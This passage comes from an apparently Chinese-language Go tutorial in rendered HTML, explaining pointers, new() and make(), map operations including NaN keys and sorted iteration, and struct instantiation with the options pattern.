&amp;a)<br>fmt.Printf(<span class="hljs-string">&quot;b:%p type:%T\n&quot;</span>, b, b)<br>fmt.Println(&amp;b)<br>&#125;<br>&gt;&gt;<br>a:<span class="hljs-number">10</span> ptr:<span class="hljs-number">0xc00008c098</span><br>b:<span class="hljs-number">0xc00008c098</span> <span class="hljs-keyword">type</span>:*<span class="hljs-type">int</span><br><span class="hljs-number">0xc000090048</span><br></code></pre></td></tr></table></figure><h2 id="指针取值"><a href="#指针取值" class="headerlink" title="指针取值"></a>指针取值</h2><p>对普通变量使用 <code>&amp;</code> 取地址后会获得这个变量的指针，然后对指针使用 <code>*</code> 解引用，也就是指针取值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>a := <span class="hljs-number">10</span><br>b := &amp;a<br>fmt.Printf(<span class="hljs-string">&quot;%T\n&quot;</span>, b)<br><br>c := *b<br>fmt.Printf(<span class="hljs-string">&quot;%T\n&quot;</span>, c)<br>fmt.Printf(<span class="hljs-string">&quot;%v\n&quot;</span>, c)<br>&#125;<br>&gt;&gt;<br>*<span class="hljs-type">int</span><br><span class="hljs-type">int</span><br><span class="hljs-number">10</span><br></code></pre></td></tr></table></figure><p>  取地址操作符 <code>&amp;</code> 和取值操作符 <code>*</code> 是一对互补操作符，<code>&amp;</code> 取出地址，<code>*</code> 根据地址取出地址指向的值</p><p>而且 <code>*</code> 还能声明指针</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> numPtr *<span class="hljs-type">int</span><br>fmt.Println(numPtr)<br>&#125;<br></code></pre></td></tr></table></figure><p><code>*int</code> 代表变量是 <code>int</code> 型指针，指针必须要初始化，不然就是空指针，可以取地址符将其他变量的地址赋给该指针，还能使用内置函数 <code>new</code>() 手动分配</p><h2 id="new"><a href="#new" class="headerlink" title="new()"></a>new()</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> numPtr *<span class="hljs-type">int</span><br>numPtr = <span class="hljs-built_in">new</span>(<span class="hljs-type">int</span>)<br>fmt.Println(numPtr)<br>&#125;<br>&gt;&gt;<br><span class="hljs-number">0xc00008c098</span><br></code></pre></td></tr></table></figure><p><code>new()</code> 函数只有一个参数，参数为类型，返回一个对应类型的指针，会对指针分配内存，并且指针指向对应类型的零值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>fmt.Println(*<span class="hljs-built_in">new</span>(<span class="hljs-type">string</span>))<br>fmt.Println(*<span class="hljs-built_in">new</span>(<span class="hljs-type">int</span>))<br>fmt.Println(*<span class="hljs-built_in">new</span>([<span class="hljs-number">5</span>]<span class="hljs-type">int</span>))<br>fmt.Println(*<span class="hljs-built_in">new</span>([]<span class="hljs-type">float64</span>))<br>&#125;<br>&gt;&gt;<br><br><span class="hljs-number">0</span><br>[<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>]<br>[]<br></code></pre></td></tr></table></figure><p>变量、指针地址、指针变量、取地址、取值</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gcode">对变量进行取地址 <span class="hljs-comment">(&amp;)</span>，可以得到变量的指针变量<br>指针变量值为指针地址<br>指针变量进行取值 <span class="hljs-comment">(*)</span>，可以得到指针变量指向的原变量的值<br></code></pre></td></tr></table></figure><p>指针传值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ptr1</span><span class="hljs-params">(x <span class="hljs-type">int</span>)</span></span> &#123;<br>x = <span class="hljs-number">100</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ptr2</span><span class="hljs-params">(x *<span class="hljs-type">int</span>)</span></span> &#123;<br>*x = <span class="hljs-number">100</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>a := <span class="hljs-number">10</span><br>ptr1(a)<br>fmt.Println(a)<br>ptr2(&amp;a)<br>fmt.Println(a)<br>&#125;<br>&gt;&gt;<br><span class="hljs-number">10</span><br><span class="hljs-number">100</span><br></code></pre></td></tr></table></figure><p>值传递不会影响 a 的值，所以第一次输出 a 的值不变</p><h2 id="make"><a href="#make" class="headerlink" title="make"></a>make</h2><p>和 new() 一样，是用来分配内存的，但是与 new() 有区别的是，它只用于 slice、map 和 channel 的内存创建，返回的类型就是这三个类型本身，而不是指针类型</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">make</span><span class="hljs-params">(t Type,size ...IntegerType)</span></span> Type<br></code></pre></td></tr></table></figure><p>比如说</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> b <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span><br>b = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>, <span class="hljs-number">10</span>)<br>b[<span class="hljs-string">&quot;aaa&quot;</span>] = <span class="hljs-number">100</span><br>fmt.Println(b)<br>&#125;<br>&gt;&gt;<br><span class="hljs-keyword">map</span>[aaa:<span class="hljs-number">100</span>]<br></code></pre></td></tr></table></figure><p><strong>区别</strong></p><p>make() 只用于 slice、map 以及 channel 的初始化，返回的还是这三个类型本身</p><p>new() 用于类型的内存分配，并对内存对应的值为类型零值，返回指向类型的指针</p><h1 id="map"><a href="#map" class="headerlink" title="map"></a>map</h1><p>映射表的数据结构实现通常两种：哈希表 (hash table ) 和搜索树 (search tree)，无序和有序。在 Go 中 map 的实现是基于哈希桶，所以也无序，必须要初始化才能使用</p><h2 id="初始化-1"><a href="#初始化-1" class="headerlink" title="初始化"></a>初始化</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">map</span>[KeyType]ValueType<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>scoreMap := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>, <span class="hljs-number">8</span>)<br>scoreMap[<span class="hljs-string">&quot;butt3rf1y&quot;</span>] = <span class="hljs-number">100</span><br>scoreMap[<span class="hljs-string">&quot;butt3rf2y&quot;</span>] = <span class="hljs-number">90</span><br>fmt.Println(scoreMap)<br>fmt.Println(scoreMap[<span class="hljs-string">&quot;butt3rf2y&quot;</span>])<br>fmt.Printf(<span class="hljs-string">&quot;%T\n&quot;</span>, scoreMap)<br>&#125;<br>&gt;&gt;<br><span class="hljs-keyword">map</span>[butt3rf1y:<span class="hljs-number">100</span> butt3rf2y:<span class="hljs-number">90</span>]<br><span class="hljs-number">90</span><br><span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span><br></code></pre></td></tr></table></figure><p>map 类型的变量默认初始值为 nil，需要用 <code>make()</code> 函数来分配内存</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[KeyType]ValueType,[<span class="hljs-built_in">cap</span>])<br></code></pre></td></tr></table></figure><p>接收两个参数，类型与初始容量</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">mp1 := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>, <span class="hljs-number">8</span>)<br>mp2 := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>][]<span class="hljs-type">int</span>, <span class="hljs-number">10</span>)<br></code></pre></td></tr></table></figure><p>map 数据都是成对出现的。支持在声明的时填充元素</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>mp := <span class="hljs-keyword">map</span>[<span class="hljs-type">int</span>]<span class="hljs-type">string</span>&#123;<br><span class="hljs-number">0</span>: <span class="hljs-string">&quot;b&quot;</span>,<br><span class="hljs-number">1</span>: <span class="hljs-string">&quot;u&quot;</span>,<br><span class="hljs-number">2</span>: <span class="hljs-string">&quot;t&quot;</span>,<br><span class="hljs-number">3</span>: <span class="hljs-string">&quot;3&quot;</span>,<br>&#125;<br>fmt.Println(mp)<br>&#125;<br>&gt;&gt;<br><span class="hljs-keyword">map</span>[<span class="hljs-number">0</span>:b <span class="hljs-number">1</span>:u <span class="hljs-number">2</span>:t <span class="hljs-number">3</span>:<span class="hljs-number">3</span>]<br></code></pre></td></tr></table></figure><h2 id="访问"><a href="#访问" class="headerlink" title="访问"></a>访问</h2><p>map 的访问和数组通过索引访问差不多，通过 Key 访问 Value</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>mp := <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>&#123;<br><span class="hljs-string">&quot;a&quot;</span>: <span class="hljs-number">0</span>,<br><span class="hljs-string">&quot;b&quot;</span>: <span class="hljs-number">1</span>,<br><span class="hljs-string">&quot;c&quot;</span>: <span class="hljs-number">2</span>,<br><span class="hljs-string">&quot;d&quot;</span>: <span class="hljs-number">3</span>,<br>&#125;<br>fmt.Println(mp[<span class="hljs-string">&quot;a&quot;</span>])<br>fmt.Println(mp[<span class="hljs-string">&quot;b&quot;</span>])<br>fmt.Println(mp[<span class="hljs-string">&quot;c&quot;</span>])<br>fmt.Println(mp[<span class="hljs-string">&quot;d&quot;</span>])<br>fmt.Println(mp[<span class="hljs-string">&quot;e&quot;</span>])<br>&#125;<br></code></pre></td></tr></table></figure><p>上面的代码中并不存在 e 的键值对，但是依然有返回值 0，map 对于不存在的键返回值是对应类型的<strong>零值</strong>，并且在访问 map 的时候其实有两个返回值，第一个返回对应类型的值，第二个返回值为布尔值，代表键是否存在，比如说</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>mp := <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>&#123;<br><span class="hljs-string">&quot;a&quot;</span>: <span class="hljs-number">0</span>,<br><span class="hljs-string">&quot;b&quot;</span>: <span class="hljs-number">1</span>,<br><span class="hljs-string">&quot;c&quot;</span>: <span class="hljs-number">2</span>,<br><span class="hljs-string">&quot;d&quot;</span>: <span class="hljs-number">3</span>,<br>&#125;<br><span class="hljs-keyword">if</span> val, exist := mp[<span class="hljs-string">&quot;e&quot;</span>]; exist &#123;<br>fmt.Println(val)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;不存在&quot;</span>)<br>&#125;<br>&#125;<br>&gt;&gt;<br>不存在<br></code></pre></td></tr></table></figure><p>求 map 长度用 <code>len()</code> 函数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-built_in">len</span>(mp)<br></code></pre></td></tr></table></figure><h2 id="存值"><a href="#存值" class="headerlink" title="存值"></a>存值</h2><p>类似数组存值，存值时使用已存在的键会覆盖原有的值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>mp := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>, <span class="hljs-number">10</span>)<br>mp[<span class="hljs-string">&quot;a&quot;</span>] = <span class="hljs-number">1</span><br>mp[<span class="hljs-string">&quot;b&quot;</span>] = <span class="hljs-number">2</span><br><span class="hljs-keyword">if</span> _, exist := mp[<span class="hljs-string">&quot;b&quot;</span>]; exist &#123;<br>mp[<span class="hljs-string">&quot;b&quot;</span>] = <span class="hljs-number">3</span><br>&#125;<br>fmt.Println(mp)<br>&#125;<br>&gt;&gt;<br><span class="hljs-keyword">map</span>[a:<span class="hljs-number">1</span> b:<span class="hljs-number">3</span>]<br></code></pre></td></tr></table></figure><p>但是当键为 <code>math.NaN()</code> 时</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>mp := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">float64</span>]<span class="hljs-type">string</span>, <span class="hljs-number">10</span>)<br>mp[math.NaN()] = <span class="hljs-string">&quot;a&quot;</span><br>mp[math.NaN()] = <span class="hljs-string">&quot;b&quot;</span><br>mp[math.NaN()] = <span class="hljs-string">&quot;c&quot;</span><br>_, exist := mp[math.NaN()]<br>fmt.Println(exist)<br>fmt.Println(mp)<br>&#125;<br>&gt;&gt;<br><span class="hljs-literal">false</span><br><span class="hljs-keyword">map</span>[NaN:c NaN:a NaN:b]<br></code></pre></td></tr></table></figure><p>相同的键值并没有被覆盖，而是并存。NaN 的实现是由底层的汇编指令 <code>UCOMISD</code> 完成的，这是一个无序比较双精度浮点数的指令。任何数字都不等于 NaN，NaN 也不等于自身，每次哈希值就不同，所以不要用 NaN 作为 map 的键</p><h2 id="delete"><a href="#delete" class="headerlink" title="delete()"></a>delete()</h2><p>删除键值对，用 <code>delete()</code> 函数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-built_in">delete</span>(<span class="hljs-keyword">map</span>,key)<br><span class="hljs-keyword">map</span>:要删除的 <span class="hljs-keyword">map</span><br>key:要删除的键值对的 key<br></code></pre></td></tr></table></figure><p>比如</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>mp := <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>&#123;<br><span class="hljs-string">&quot;a&quot;</span>: <span class="hljs-number">0</span>,<br><span class="hljs-string">&quot;b&quot;</span>: <span class="hljs-number">1</span>,<br><span class="hljs-string">&quot;c&quot;</span>: <span class="hljs-number">2</span>,<br><span class="hljs-string">&quot;d&quot;</span>: <span class="hljs-number">3</span>,<br>&#125;<br>fmt.Println(mp)<br><span class="hljs-built_in">delete</span>(mp, <span class="hljs-string">&quot;a&quot;</span>)<br>fmt.Println(mp)<br>&#125;<br>&gt;&gt;<br><span class="hljs-keyword">map</span>[a:<span class="hljs-number">0</span> b:<span class="hljs-number">1</span> c:<span class="hljs-number">2</span> d:<span class="hljs-number">3</span>]<br><span class="hljs-keyword">map</span>[b:<span class="hljs-number">1</span> c:<span class="hljs-number">2</span> d:<span class="hljs-number">3</span>]<br></code></pre></td></tr></table></figure><p>如果值为 NaN，那么没办法删除键值对</p><h2 id="遍历"><a href="#遍历" class="headerlink" title="遍历"></a>遍历</h2><p>用 <code>for range</code> 遍历 map</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>mp := <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>&#123;<br><span class="hljs-string">&quot;a&quot;</span>: <span class="hljs-number">0</span>,<br><span class="hljs-string">&quot;b&quot;</span>: <span class="hljs-number">1</span>,<br><span class="hljs-string">&quot;c&quot;</span>: <span class="hljs-number">2</span>,<br><span class="hljs-string">&quot;d&quot;</span>: <span class="hljs-number">3</span>,<br>&#125;<br><span class="hljs-keyword">for</span> key, val := <span class="hljs-keyword">range</span> mp &#123;<br>fmt.Println(key, val)<br>&#125;<br>&#125;<br>&gt;&gt;<br>c <span class="hljs-number">2</span><br>d <span class="hljs-number">3</span><br>a <span class="hljs-number">0</span><br>b <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>因为 map 是无序的，遍历出来也是无序的</p><p>按照指定顺序遍历</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> scoreMap = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>, <span class="hljs-number">200</span>)<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++ &#123;<br>key := fmt.Sprintf(<span class="hljs-string">&quot;%02d&quot;</span>, i)<br>value := rand.Intn(<span class="hljs-number">100</span>)<span class="hljs-comment">// 生成 0-99 的随机整数</span><br>scoreMap[key] = value<br>&#125;<br><span class="hljs-comment">// 取出 map 的所有 key 存入切片 keys</span><br><span class="hljs-keyword">var</span> keys = <span class="hljs-built_in">make</span>([]<span class="hljs-type">string</span>, <span class="hljs-number">0</span>, <span class="hljs-number">200</span>)<br><span class="hljs-keyword">for</span> key := <span class="hljs-keyword">range</span> scoreMap &#123;<br>keys = <span class="hljs-built_in">append</span>(keys, key)<br>&#125;<br><span class="hljs-comment">// 对切片进行排序</span><br>sort.Strings(keys)<br><span class="hljs-comment">// 按照排序后的 key 遍历 map</span><br><span class="hljs-keyword">for</span> _, key := <span class="hljs-keyword">range</span> keys &#123;<br>fmt.Println(key, scoreMap[key])<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h1><p>结构体声明，和一般结构体声明一样</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> 类型名 <span class="hljs-keyword">struct</span> &#123;<br>  字段名 字段类型<br>  字段名 字段类型<br>  …<br>&#125;<br><br><span class="hljs-keyword">type</span> Programmer <span class="hljs-keyword">struct</span> &#123;<br>  Name     <span class="hljs-type">string</span><br>  Age      <span class="hljs-type">int</span><br>  Job      <span class="hljs-type">string</span><br>  Language []<span class="hljs-type">string</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="实例化"><a href="#实例化" class="headerlink" title="实例化"></a>实例化</h2><p>go 没有构造方法，初始化像 map 一样指定字段名称再初始化字段值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go">programmer:=Programmer&#123;<br>Name:<span class="hljs-string">&quot;butt3rf1y&quot;</span>,<br>Age:<span class="hljs-number">18</span>,<br>Job:<span class="hljs-string">&quot;stu&quot;</span>,<br>Language:[]<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;Go&quot;</span>,<span class="hljs-string">&quot;Java&quot;</span>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果实例化过程比较复杂，可以使用函数来实例化</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Person <span class="hljs-keyword">struct</span> &#123;<br>  Name    <span class="hljs-type">string</span><br>  Age     <span class="hljs-type">int</span><br>  Address <span class="hljs-type">string</span><br>  Salary  <span class="hljs-type">float64</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewPerson</span><span class="hljs-params">(name <span class="hljs-type">string</span>, age <span class="hljs-type">int</span>, address <span class="hljs-type">string</span>, salary <span class="hljs-type">float64</span>)</span></span> *Person &#123;<br>  <span class="hljs-keyword">return</span> &amp;Person&#123;Name: name, Age: age, Address: address, Salary: salary&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>就像构造函数，但是 go 不支持函数与方法重载，如果需要用多种方式实例化结构体，要么创建多个构造函数，要么使用 options 模式</p><h2 id="options-模式"><a href="#options-模式" class="headerlink" title="options 模式"></a>options 模式</h2><p>假设有一个下面的结构体</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Person <span class="hljs-keyword">struct</span> &#123;<br>  Name     <span class="hljs-type">string</span><br>  Age      <span class="hljs-type">int</span><br>  Address  <span class="hljs-type">string</span><br>  Salary   <span class="hljs-type">float64</span><br>  Birthday <span class="hljs-type">string</span><br>&#125;<br></code></pre></td></tr></table></figure><p>声明一个 <code>PersonOptions</code> 类型，接收一个 <code>*Person</code> 类型的参数，必须是指针</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> PersonOptions <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(p *Person)</span></span><br></code></pre></td></tr></table></figure><p>创建选项函数，一般是 <code>With</code> 开头，返回值为一个闭包函数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">WithName</span><span class="hljs-params">(name <span class="hljs-type">string</span>)</span></span> PersonOptions &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(p *Person)</span></span> &#123;<br>p.Name = name<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">WithAge</span><span class="hljs-params">(age <span class="hljs-type">int</span>)</span></span> PersonOptions &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(p *Person)</span></span> &#123;<br>p.Age = age<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">WithAddress</span><span class="hljs-params">(address <span class="hljs-type">string</span>)</span></span> PersonOptions &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(p *Person)</span></span> &#123;<br>p.Address = address<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">WithSalary</span><span class="hljs-params">(salary <span class="hljs-type">float64</span>)</span></span> PersonOptions &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(p *Person)</span></span> &#123;<br>p.Salary = salary<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>实际声明的构造函数签名，接受一个可变长的 <code>PersonOptions</code> 类型的参数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 